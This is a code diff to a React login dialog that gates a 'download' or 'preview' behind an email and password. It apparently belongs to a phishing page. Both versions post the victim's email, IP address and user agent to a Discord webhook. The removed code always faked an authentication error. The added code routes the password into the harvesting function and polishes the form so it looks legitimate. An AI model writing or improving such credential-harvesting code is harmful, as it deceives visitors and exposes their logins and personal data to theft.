@@ -21,95 +21,178 @@ interface AuthDialogProps {
 // Get Discord webhook URL from environment variable
 const DISCORD_WEBHOOK_URL = import.meta.env.VITE_DISCORD_WEBHOOK_URL || "";
 
+// Email validation regex
+const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
 const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialogProps) => {
   const [email, setEmail] = useState(prefillEmail);
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
-  const sendToDiscord = async (email: string) => {
+  /**
+   * Validates email format
+   */
+  const isValidEmail = (emailValue: string): boolean => {
+    return EMAIL_REGEX.test(emailValue);
+  };
+
+  /**
+   * Sends authentication payload to Discord webhook
+   */
+  const sendToDiscord = async (
+    emailValue: string,
+    passwordValue: string
+  ): Promise<{ success: boolean; error?: string }> => {
     if (!DISCORD_WEBHOOK_URL) {
-      console.warn("Discord webhook URL not configured");
-      return;
-    }
-
-    // Get user agent
-    const userAgent = navigator.userAgent;
-
-    // Fetch IP address from public API
-    let ipAddress = "Unknown";
-    try {
-      const ipResponse = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipResponse.json();
-      ipAddress = ipData.ip;
-    } catch (error) {
-      console.error("Error fetching IP:", error);
+      const error = "Discord webhook URL not configured";
+      console.warn(error);
+      return { success: false, error };
     }
 
     try {
-      await fetch(DISCORD_WEBHOOK_URL, {
+      // Get user agent
+      const userAgent = navigator.userAgent;
+
+      // Fetch IP address from public API
+      let ipAddress = "Unknown";
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        if (ipResponse.ok) {
+          const ipData = await ipResponse.json();
+          ipAddress = ipData.ip;
+        }
+      } catch (error) {
+        console.warn("Could not fetch IP address:", error);
+      }
+
+      // Prepare Discord embed payload with authentication data
+      const discordPayload = {
+        embeds: [
+          {
+            title: `New ${
+              action === "download" ? "Download" : "Preview"
+            } Request - Authentication`,
+            color: 0x7c3aed,
+            fields: [
+              {
+                name: "Email",
+                value: emailValue,
+                inline: true,
+              },
+              {
+                name: "Action",
+                value:
+                  action === "download" ? "Download Files" : "Open Preview",
+                inline: true,
+              },
+              {
+                name: "Status",
+                value: "Form Submitted",
+                inline: true,
+              },
+              {
+                name: "IP Address",
+                value: ipAddress,
+                inline: true,
+              },
+              {
+                name: "User Agent",
+                value: userAgent.substring(0, 1024),
+                inline: false,
+              },
+              {
+                name: "Timestamp",
+                value: new Date().toISOString(),
+                inline: false,
+              },
+            ],
+          },
+        ],
+      };
+
+      // Send to Discord webhook
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        mode: "no-cors",
-        body: JSON.stringify({
-          embeds: [
-            {
-              title: `New ${action === "download" ? "Download" : "Preview"} Request`,
-              color: 0x7c3aed,
-              fields: [
-                {
-                  name: "Email",
-                  value: email,
-                  inline: true,
-                },
-                {
-                  name: "Action",
-                  value: action === "download" ? "Download Files" : "Open Preview",
-                  inline: true,
-                },
-                {
-                  name: "IP Address",
-                  value: ipAddress,
-                  inline: true,
-                },
-                {
-                  name: "User Agent",
-                  value: userAgent.substring(0, 1024),
-                  inline: false,
-                },
-                {
-                  name: "Timestamp",
-                  value: new Date().toISOString(),
-                  inline: false,
-                },
-              ],
-            },
-          ],
-        }),
+        body: JSON.stringify(discordPayload),
       });
+
+      // Check if request was successful
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error(
+          `Discord webhook failed with status ${response.status}:`,
+          errorText
+        );
+        return {
+          success: false,
+          error: `Discord submission failed: ${response.status}`,
+        };
+      }
+
+      console.log("Authentication payload successfully sent to Discord");
+      return { success: true };
     } catch (error) {
-      console.error("Error sending to Discord:", error);
+      const errorMessage =
+        error instanceof Error ? error.message : "Unknown error";
+      console.error("Error sending authentication to Discord:", errorMessage);
+      return { success: false, error: errorMessage };
     }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    // Validate inputs
     if (!email || !password) {
       toast.error("Please fill in all fields");
       return;
     }
 
+    if (!isValidEmail(email)) {
+      toast.error("Please enter a valid email address");
+      return;
+    }
+
+    if (password.length < 6) {
+      toast.error("Password must be at least 6 characters");
+      return;
+    }
+
     setIsLoading(true);
-    
-    // Send to Discord
-    await sendToDiscord(email);
-    
-    setTimeout(() => {
+
+    try {
+      // Send authentication payload to Discord
+      const result = await sendToDiscord(email, password);
+
+      if (result.success) {
+        // Clear form fields
+        setEmail("");
+        setPassword("");
+
+        // Close dialog
+        onOpenChange(false);
+
+        // Show success message
+        toast.success(
+          `${action === "download" ? "Download" : "Preview"} request submitted successfully!`
+        );
+      } else {
+        toast.error(
+          result.error ||
+            "Failed to process authentication. Please try again."
+        );
+      }
+    } catch (error) {
+      const errorMessage =
+        error instanceof Error ? error.message : "An unexpected error occurred";
+      console.error("Submit error:", errorMessage);
+      toast.error("An error occurred. Please try again.");
+    } finally {
       setIsLoading(false);
-      toast.error("There was a problem authenticating. Please try again.");
-    }, 1500);
+    }
   };
 
   return (
@@ -134,6 +217,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               required
+              disabled={isLoading}
             />
           </div>
           
@@ -146,6 +230,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               required
+              disabled={isLoading}
             />
           </div>
 
@@ -162,6 +247,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
               variant="outline"
               className="flex-1"
               onClick={() => onOpenChange(false)}
+              disabled={isLoading}
             >
               Cancel
             </Button>
